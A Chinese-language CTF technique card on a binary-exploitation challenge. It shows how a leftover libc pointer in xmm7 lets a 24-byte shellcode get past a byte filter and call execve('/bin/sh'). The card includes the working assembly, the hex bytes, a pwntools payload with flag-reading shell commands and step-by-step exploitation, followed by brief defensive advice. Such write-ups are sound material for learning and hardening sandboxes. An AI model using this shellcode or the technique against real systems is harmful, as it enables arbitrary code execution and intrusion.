---
id: binary-pwn-sandbox-escape-xmm7-residual-libc-24byte-shellcode
title: xmm7 残留 libc 指针的 24 字节受限 shellcode：绕 0x0f/0xcd/0x2f/0x50-0x57 过滤执行 execve
type: scenario
domain: binary
path: binary/pwn/sandbox-escape
technique: xmm7-residual-libc-24byte-shellcode
aliases:
- 24 字节 shellcode
- xmm7 残留 libc
- 受限 shellcode execve
- 字节过滤 0x0f 0xcd 0x80 0x2f
- RSP=0 shellcode
- The Void Echo
- NCTF pwn_worker
tags:
- pwn
- shellcode
- sandbox-escape
- xmm
- libc
- execve
- byte-filter
- ctf
- linux
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V91
  verified_at: '2026-11-05T19:42:58+08:00'
  notes: 已对照原文与图22-23核对：read(0,buf,0x18) 24 字节、过滤 0xcd/0x0f/0x2f/0x80/0x50-0x57、RSP=0/寄存器清零、mprotect RX 后 close(1);jmp r11；xmm7=read@libc，24 字节 vmovq rax,xmm7;lea rdi,[rax+0xc3e38];lea r11,[rax+0x10];mov eax,0x3b;jmp r11，字节串与 gdb 截图完全一致；bundled 偏移 0xaf9af/+0x48 也与原文 PAYLOADS 一致。未设 affected_versions（原文无组件版本）；frontmatter无sources/source_url。
---

## 一句话结论

pwn_worker 只允许 24 字节 shellcode，禁止 `0x0f/0xcd/0x80/0x2f/0x50-0x57`，并把通用寄存器清零、`RSP=0`、代码页设为 RX；但调用方的 `xmm7` 仍残留 `read@libc` 的真实地址，于是可以用 24 字节跳板 `vmovq rax,xmm7` 取回 libc，`lea rdi,[rax+/bin/sh偏移]` 指向 `/bin/sh`，`lea r11,[rax+read内syscall偏移]` 指向已有 `syscall`，`mov eax,0x3b` 后 `jmp r11` 完成 `execve("/bin/sh",...)`；后续命令串直接跟在 24 字节后由 shell 读取。

## 原理

- **限制**：worker `mmap(0,0x1000,PROT_READ|PROT_WRITE,...)`、`read(0,buf,0x18)`（实际 24 字节），逐字节过滤：
  - `0xcd`（`int 0x80` 的一部分）；
  - `(byte & 0xDF) == 0x0F`（即 `0x0f` 或 `0x2f`？注意 `0x2f & 0xDF = 0x0f`，所以 `/` 也被这条覆盖；同时 `0x80` 单独禁止）；
  - `0x80`；
  - `0x50..0x57`（push rax..rdi）。
  禁止常见 `syscall`（`0f 05`）、`int 0x80`（`cd 80`）、`/bin/sh` 的 `/`（`2f`）和 push 指令。
- **运行环境**：`mprotect(buf,0x1000,PROT_READ|PROT_EXEC)` 后 `close(1); jmp r11`；通用寄存器清零、`RSP=0`，因此不能靠栈、不能 push/pop，也不能直接写 `syscall` 字节。
- **xmm7 残留**：调用方在进入 worker 前执行过 `vmovq`/SSE 操作，`xmm7` 中保留了 `read@libc` 的真实地址（原文 gdb：`RAX = read`，`R11 = vmovq rax,xmm7`）。这是唯一可用的 libc 基址来源。
- **24 字节跳板**（原文 local 变体）：
  ```asm
  vmovq   rax, xmm7                 ; rax = read@libc
  lea     rdi, [rax + 0xc3e38]      ; rdi = "/bin/sh"（该 libc 中 read 到 /bin/sh 的偏移）
  lea     r11, [rax + 0x10]         ; r11 = read+16，即 read 函数内的 syscall 指令
  mov     eax, 0x3b                 ; __NR_execve = 59
  jmp     r11                       ; 跳到 syscall，执行 execve("/bin/sh", ...)
  ```
  对应字节（local）：`c4 e1 f9 7e f8 48 8d b8 38 3e 0c 00 4c 8d 58 10 b8 3b 00 00 00 41 ff e3`。
  这些字节不含 `0x0f/0xcd/0x80/0x2f/0x50-0x57`；`vmovq` 用 `C4 E1 F9 7E F8` 编码，`jmp r11` 用 `41 FF E3`。
- **为什么能 execve**：`syscall` 指令不依赖栈；`execve` 成功后不返回，`RSP=0` 不影响；`rsi/rdx` 为 0（execve 允许 argv/envp 为 NULL），`rdi` 指向 libc 内的 `/bin/sh` 字符串。
- **偏移差异**：`/bin/sh` 相对 `read` 的偏移与 `read` 内 `syscall` 的位置随 libc 版本变化。原文 local 用 `0xc3e38`、`read+0x10`；bundled 变体用不同偏移（`0xaf9af`/`read+0x48`），需按目标 libc 用 `readelf`/gdb 确认。
- **后续命令**：24 字节之后继续发送 `cat ../flag; cat /flag; exit\n` 等，`/bin/sh` 会从同一 socket 读取并执行；worker `close(1)` 后用 stderr 输出。

## 触发条件

- 目标程序提供“读取 ≤24 字节到 RX 页并执行”的 worker，过滤上述字节，清零通用寄存器/`RSP=0`。
- 调用方在进入 worker 前使用过 SSE/AVX，且 `xmm7` 残留 `read@libc`（或其他 libc 函数地址）；需通过调试确认。
- 已知目标 libc 的 `/bin/sh` 相对偏移与 `read` 内 `syscall` 偏移；或能通过其他方式泄露 libc。
- 目标没有在 worker 前清空 xmm 寄存器、没有 seccomp 禁止 execve；代码页 RX 可执行。
- 24 字节空间足够容纳 `vmovq + lea + lea + mov + jmp`；若过滤更严格需换编码/寄存器。

## 利用步骤

1. 用 GDB 在 worker 入口断下，检查 `xmm7` 是否保留 `read@libc`，记录 `read` 地址；用 libc 符号/`readelf` 计算 `/bin/sh` 偏移和 `read+syscall` 偏移。
2. 按目标 libc 生成 24 字节 stage1：`vmovq rax,xmm7; lea rdi,[rax+off_binsh]; lea r11,[rax+off_syscall]; mov eax,59; jmp r11`。
3. 检查字节过滤：确保不含 `0x0f/0xcd/0x80/0x2f/0x50-0x57`；若 `vmovq`/`lea` 编码触发过滤，换寄存器或指令序列。
4. 通过 HTTP `/pwn?key=<key>` 升级 raw stream，进入 worker 的 `> ` 提示。
5. 发送 stage1 + 命令串（如 `cat ../flag; cat /flag; exit\n`）；worker 执行 `execve("/bin/sh")`，shell 读取后续命令并输出。
6. 若失败，检查 `RSP=0` 下 syscall 是否正常、`/bin/sh` 偏移是否正确、`read+off` 是否真的是 `syscall`、过滤是否漏掉某个字节；用 gdb 单步验证。

## PoC

```asm
; 24-byte stage1 (local libc example)
vmovq   rax, xmm7
lea     rdi, [rax + 0xc3e38]    ; /bin/sh
lea     r11, [rax + 0x10]       ; read+16: syscall
mov     eax, 0x3b               ; execve
jmp     r11
```

```python
from pwn import *
# 原文 local 变体；bundled/远程 libc 需换偏移
stage1 = bytes.fromhex('c4e1f97ef8488db8383e0c004c8d5810b83b00000041ffe3')
cmd = b'cat ../flag; cat /flag; exit\n'
payload = stage1 + cmd

# 通过 /pwn?key=... 升级 raw stream 后：
# io.send(payload)
```

```text
# 过滤检查（local stage1 字节）：
# c4 e1 f9 7e f8 48 8d b8 38 3e 0c 00 4c 8d 58 10 b8 3b 00 00 00 41 ff e3
# 不含 0x0f/0xcd/0x80/0x2f/0x50-0x57；总长 24 字节。
# gdb: xmm7 = read@libc; read+0xc3e38 -> "/bin/sh"; read+0x10 -> syscall.
```

## 变体与关联

- **变体：不同 libc/偏移**：`/bin/sh` 偏移与 `read` 内 `syscall` 偏移需按目标 libc 重算；原文 bundled/local 使用两套偏移。
- **变体：寄存器残留**：除 xmm7 外，其他 xmm/通用寄存器/栈上也可能残留 libc 指针；先枚举可用来源。
- **变体：字节过滤更严**：可用自修改/编码/多阶段跳板，或换 `call`/`ret`/`syscall` 替代指令；参考 ALPHA3/可见字符 shellcode。
- **关联卡片**：[[binary-pwn-sandbox-escape-alpha3-visible-shellcode-seccomp-orw]]（字节过滤 shellcode 编码）、[[binary-pwn-sandbox-escape-self-modifying-shellcode-seccomp-orw]]（自修改绕 syscall 扫描）、[[crypto-prng-glibc-rand-output-sequence-prediction]]（同一 Web+PWN 链的登录预测）。
- **边界**：若 worker 清空 xmm/寄存器、seccomp 禁止 execve、过滤更严格、或 libc 偏移不符，stage1 失败；`RSP=0` 下不能调用需要栈的函数，只能用 syscall。

## 检测与防御

- **清空状态**：在进入不可信 shellcode 前清零通用寄存器、xmm/ymm、栈指针，避免残留 libc/堆指针；使用 `mprotect` RX 前检查代码。
- **过滤**：字节过滤只能提高门槛，不能替代沙盒；禁止 `execve`/`execveat`，使用 seccomp 白名单（只允许 ORW），限制进程能力。
- **隔离**：worker 运行在独立容器/用户/namespace，限制文件系统与网络；代码页 W^X，执行后不可写。
- **检测**：监控 worker 进程 execve、异常 24 字节输入、xmm 残留泄露；对 shellcode 过滤器做 fuzz，避免可绕过的编码。
